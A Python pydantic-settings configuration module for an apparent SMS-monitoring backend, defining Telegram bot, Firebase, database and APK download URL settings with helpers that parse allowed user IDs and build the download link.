from functools import lru_cache

from pydantic_settings import BaseSettings, SettingsConfigDict


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8")

    telegram_bot_token: str = ""
    telegram_allowed_users: str = ""
    api_secret_key: str = "dev-secret-change-me"
    database_url: str = "sqlite:///./sms_monitor.db"
    port: int = 8000
    virtus_module_db: str = "https://virtus-module-default-rtdb.firebaseio.com"
    firebase_workers: int = 100
    public_base_url: str = ""
    apk_github_url: str = (
        "https://raw.githubusercontent.com/hivirtusss/V2-testing-done/"
        "cursor/astik-minimal-flow-8042/apk/virtus-sms-module.apk"
    )

    @property
    def apk_download_url(self) -> str:
        base = self.public_base_url.strip().rstrip("/")
        if base:
            return f"{base}/download/apk"
        return self.apk_github_url.strip()

    @property
    def allowed_user_ids(self) -> set[int]:
        if not self.telegram_allowed_users.strip():
            return set()
        return {
            int(user_id.strip())
            for user_id in self.telegram_allowed_users.split(",")
            if user_id.strip().isdigit()
        }


@lru_cache
def get_settings() -> Settings:
    return Settings()
